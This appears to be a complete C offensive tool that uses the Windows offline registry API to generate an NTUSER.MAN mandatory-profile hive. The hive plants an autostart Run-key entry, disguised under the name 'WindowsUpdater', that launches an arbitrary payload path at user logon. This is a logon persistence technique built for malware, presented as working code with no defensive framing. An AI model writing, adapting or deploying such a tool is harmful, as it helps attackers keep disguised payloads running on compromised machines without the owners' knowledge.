#include <windows.h>
#include <stdio.h>
#include <offreg.h>


BOOL SetHiveValue(ORHKEY hRoot, LPCWSTR subKey, LPCWSTR valueName, LPCWSTR data) {
    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    BOOL bRet = FALSE;

    LONG status = ORCreateKey(hRoot, subKey, NULL, REG_OPTION_NON_VOLATILE,
                              KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
                              NULL, &hKey, &dwDisposition);
    if (status != ERROR_SUCCESS) return FALSE;

    status = ORSetValue(hKey, valueName, 0, REG_SZ,
                        (const BYTE*)data,
                        (DWORD)((wcslen(data) + 1) * sizeof(WCHAR)));
    if (status == ERROR_SUCCESS) bRet = TRUE;

    ORCloseKey(hKey);
    return bRet;
}

void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion && pRtlGetVersion(&osvi) == 0) {
            *pMajor = osvi.dwMajorVersion;
            *pMinor = osvi.dwMinorVersion;
            return;
        }
    }
    *pMajor = 10; *pMinor = 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        wprintf(L"Usage: %s <payload_path> <output_ntuser_man>\n", argv[0]);
        return 1;
    }

    LPCWSTR payloadPath = argv[1];
    LPCWSTR outputPath  = argv[2];

    DWORD osMajor = 0, osMinor = 0;
    GetRealOsVersion(&osMajor, &osMinor);

    ORHKEY hHive = NULL;
    LONG status = ORCreateHive(&hHive);
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORCreateHive failed: %lu\n", status);
        return 1;
    }

    LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName  = L"WindowsUpdater";

    if (!SetHiveValue(hHive, runKeyPath, valueName, payloadPath)) {
        ORCloseHive(hHive);
        return 1;
    }

    status = ORSaveHive(hHive, outputPath, osMajor, osMinor);
    if (status != ERROR_SUCCESS) {
        wprintf(L"[-] ORSaveHive failed: %lu\n", status);
        ORCloseHive(hHive);
        return 1;
    }

    wprintf(L"[+] Successfully generated VALID NTUSER.MAN at: %s\n", outputPath);
    ORCloseHive(hHive);
    return 0;
}
